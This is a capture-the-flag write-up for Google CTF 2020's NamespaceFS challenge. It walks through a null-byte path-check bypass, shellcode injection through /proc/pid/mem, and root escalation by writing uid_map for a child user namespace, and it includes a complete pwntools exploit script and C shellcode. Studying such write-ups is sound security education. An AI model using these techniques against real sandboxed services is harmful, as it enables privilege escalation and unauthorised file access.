# Writeup for NamespaceFS (sandbox, 383 pts, 8 solves), Google CTF 2020, by LevitatingLion

> A remote filesystem with protobufs and namespace-based security. You can find the flag at /home/user/flag (read-only by root)

## Challenge Overview

For this challenge we are provided with the C++ source code for a binary running on the challenge server. The binary is started with uid 0 and does the following:

- Spawn a sandbox:
  - Fork off a child process with new user, pid, mount and net namespaces
  - In the child:
    - Mount new `tmpfs` over `/tmp`
    - `setresuid(1338, 1338, 1338)`
    - Execute an `init` binary, which does `while (1) sleep(1);`
  - In the parent:
    - Setup uid and gid mappings of the child's user namespace, map 0 to 0 and 1338 to 1338 unchanged
- Drop capabilities
- Listen for incoming protobuf requests, one of:
  - `read_file(path, length, offset)`
  - `write_file(path, data, offset)`
- When a request is received:
  - Verify that `"/tmp/" + path` does not contain `..`
  - Join the sandbox:
    - Fork, parent waits for child to exit
    - Enter the user namespace of the sandbox
    - `setfsuid(1338)`
    - Enter the mount and net namespaces of the sandbox
  - On read requests:
    - Use `std::ifstream` to read the file
  - On write requests:
    - Split path at `/`
    - Resolve each directory component, create it if it doesn't exist, don't follow links
    - Open the final component, create it if it doesn't exist, don't follow links
    - Write the data using `std::ostream`

To interact with the remote server, we have to send protobuf messages. The protobuf specification is included in `nsfs.proto`, so we can generate python bindings using `protoc --python_out=. nsfs.proto`.

## Bypass the Path Check

To verify that the path does not contain `..` the server uses `strstr`, which stops at a null-byte. But when splitting the path at `/`, `std::string` is used, which supports embedded null bytes. Because of this difference, we can bypass the initial path check by including a null byte in the first path component: to access files outside `/tmp/`, we can send the path `.\0/../path/to/file`.

This bypass only works when writing files, but that is enough for the remaining exploit.

## Execute Code Inside the Sandbox

With the ability to write to any files on the system, the next step is to gain code execution inside the `init` process of the sandbox. We can write to the `init` process' `/proc/$pid/mem` file and because the `init` binary is non-PIE, we can overwrite parts of the binary at a fixed address with shellcode.

Using this, we can execute arbitrary code inside of the sandbox. The flag file is visible from inside the sandbox, but only readable by root. Because we currently run as user 1338, we still have to escalate to root. Note that we do not have to actually escape the sandbox, being root inside of the sandbox will allow us to read the flag.

## Become Root

From inside the `init` process, we fork off a child with a new user namespace. The child will have all capabilities in its new user namespace, but since uid 0 is not mapped inside this namespace, we cannot use these capabilities to become root.

Fortunately, we can use the file write to set up arbitrary uid mappings in the child's user namespace. This is possible for two reasons: 1. the server process gained all capabilities inside the sandbox' user namespace when joining it and the subsequent `setfsuid` only dropped a few unrelated capabilities, and 2. the new child's user namespace is a child of the sandbox' user namespace.

After we map uid 0 to 0 and 1338 to 1338, the child process we created initially still has all its capabilities, and can `setuid(0)` to become root. Now all that remains is reading the flag file: `CTF{every_year_these_silly_namespaces}`

## Exploit Code

Finally, the exploit script:

```python
from pwn import *
from nsfs_pb2 import Operation, READ, WRITE

init = ELF("init")

if args.REMOTE:
    p = remote("namespacefs.2020.ctfcompetition.com", 1337)
else:
    p = remote("localhost", 1337)


def do_read(path, length=0x10000, offset=0):
    op = Operation()
    op.action = READ
    op.path = path
    op.length = length
    op.offset = offset

    do_send(op)


def do_write(path, data, offset=0):
    op = Operation()
    op.action = WRITE
    op.path = path
    op.data = data
    op.offset = offset

    do_send(op)


def do_send(op):
    msg = op.SerializeToString()
    if len(msg) > 40960:
        error("Message too large")
    p.send(p32(len(msg)))
    p.send(msg)


# write shellcode to memory of init process inside the sandbox
do_write(".\0/../proc/2/mem", b"\x90" * 128 + read("sc_init"), init.symbols.main)

# wait for the shellcode to spawn a child
sleep(2)

# setup uid mappings in the child's user namespace
do_write(".\0/../proc/4/uid_map", b"0 0 1\n1338 1338 1\n")
do_write(".\0/../proc/4/gid_map", b"0 0 1\n")

p.interactive()
```

And the C-equivalent to the shellcode executed inside the sandbox:

```c
// fork process with new user namespace
if (sys_clone(CLONE_NEWUSER | SIGCHLD, NULL, NULL, NULL, 0)) {
    // parent

} else {
    // child

    // wait for exploit to set up uid mappings for our user namespace
    sleep(5);

    // become root
    sys_setresuid(0, 0, 0);

    // read the flag
    int fd = sys_open("/home/user/flag", O_RDONLY, 0);
    char buf[0x100];
    sys_read(fd, buf, sizeof buf);
    sys_write(1, buf, sizeof buf);
}

// endless loop
for (;;)
    sleep(1);
```
